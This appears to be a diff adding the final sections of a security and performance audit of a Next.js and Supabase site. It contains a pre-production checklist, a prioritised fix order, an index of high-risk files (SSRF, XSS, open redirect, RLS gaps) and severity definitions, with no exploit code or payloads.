+| Topic | Assessment |
+|-------|------------|
+| Public page caching | Good: `unstable_cache` 60s + tag design (fix article tag invalidation) |
+| Dashboard | Good: SQL RPCs for aggregates (`get_dashboard_all_timeframes`, range helpers) |
+| Image optimization | Next/Image + remotePatterns for R2/Unsplash; external URLs go through proxy (costly) |
+| Middleware | Extra Supabase + profile query on every `/admin/*` request; redirect REST call on public paths |
+| Analytics | Fire-and-forget POSTs — good UX; Redis buffer — good if Redis always on |
+| Sitemap / lists | Cap at 1000; admin search may fetch all matching accounts when searching |
+| Serverless cold start | Service role client + S3 client module init — normal; avoid huge imports on public routes |
+
+**Hotspots to watch after launch:** image-proxy traffic, uncached search API (`ok` not `okCached`), middleware redirect lookups without Redis, recursive media list on large buckets (pagination added — still expensive).
+
+---
+
+## Security checklist (pre-production)
+
+- [ ] RLS enabled + policies reviewed on **all** tables; verified with anon key  
+- [ ] Service role key **never** exposed to client or git  
+- [ ] `CRON_SECRET`, `ADMIN_API_SECRET`, R2, Upstash set and strong  
+- [ ] `NEXT_PUBLIC_SITE_URL` = real production origin  
+- [ ] HTML/ad sanitization + CSP deployed  
+- [ ] Image proxy locked down or removed  
+- [ ] Redirect validation rejects `//`  
+- [ ] Storage keys allowlisted  
+- [ ] Typecheck fails the build; tests run in CI  
+- [ ] `/test-500` removed  
+- [ ] Security headers at app or CDN  
+- [ ] Admin MFA / strong passwords  
+- [ ] Backups + point-in-time recovery on Supabase  
+- [ ] R2 bucket not world-writable; public read only for intended prefixes  
+- [ ] Monitoring: 5xx, cron success, Redis errors, auth failures  
+
+---
+
+## What is already in good shape
+
+- Layered server architecture with Zod on many admin payloads  
+- Admin API routes consistently call `requireAdmin`  
+- Middleware soft-gates `/admin` and checks `profiles.role === 'admin'` (not session-only)  
+- Public article list filters `status = published` and `deleted_at IS NULL` in app code  
+- Soft deletes for content entities  
+- Redis-buffered view/ad events with rate limits **when Redis is configured**  
+- Redirect schema restricts status codes; path-based redirects for slug changes  
+- FTS trigger on articles (`search_vector`)  
+- Dashboard SQL RPCs reduce heavy JS aggregation  
+- Admin storage GET uses `private, no-store`  
+- Cover/ad image flows appear to upload to R2 (not raw base64) in current admin UI — keep regression tests  
+
+---
+
+## Suggested fix order
+
+1. **RLS + grants audit** (blocks catastrophic data exposure)  
+2. **XSS sanitization + iframe allowlist + CSP**  
+3. **SSRF lock-down / remove open image proxy**  
+4. **Cron fail-closed secret**  
+5. **Redirect + storage key validation**  
+6. **`revalidateTag('articles')` + path revalidation**  
+7. **Atomic analytics flush**  
+8. **Generic 500 messages; security headers; env completeness**  
+9. **Remove test-500; enable typecheck in build; CI tests**  
+10. Admin UX items from `admin-panel-audit.md`  
+
+---
+
+## Appendix A — High-risk file index
+
+| File | Concern |
+|------|---------|
+| `current_schema.sql` | Incomplete RLS; default admin role |
+| `app/api/image-proxy/route.ts` | SSRF / abuse |
+| `app/api/admin/proxy-image/route.ts` | SSRF (auth only) |
+| `app/api/cron/flush/route.ts` | Optional auth; non-atomic flush |
+| `app/(site)/posts/[id]/page.tsx` | XSS via content/iframe |
+| `components/AdBanner.tsx` | XSS via `html_code` |
+| `components/MobileAdsStack.tsx` | XSS via `html_code` |
+| `middleware.ts` | Open redirect with `//` paths |
+| `server/auth.ts` | Shared admin secret superuser |
+| `server/rate-limit.ts` | Fail-open |
+| `server/actions/article.action.ts` | Missing `articles` tag revalidation |
+| `server/services/analytics.service.ts` | Race on counters |
+| `server/services/storage.service.ts` | Unscoped keys |
+| `app/api/admin/storage/upload-url/route.ts` | Arbitrary presigned keys |
+| `server/http.ts` | Error message leakage |
+| `next.config.ts` | ignoreBuildErrors; thin headers |
+| `app/(site)/test-500/page.tsx` | Prod footgun |
+
+---
+
+## Appendix B — Severity definitions
+
+| Level | Meaning |
+|-------|---------|
+| **Critical** | Likely remote exploit, data breach, or total integrity failure in production |
+| **High** | Significant security, correctness, or availability risk under realistic conditions |
+| **Medium** | Degraded SEO, ops, performance, or security defense-in-depth |
+| **Low** | Polish, minor edge cases, future hardening |
+
+---
+
+*End of report. Re-audit after Critical/High items are closed, and re-verify against the live Supabase project (RLS and grants can differ from `current_schema.sql`).*
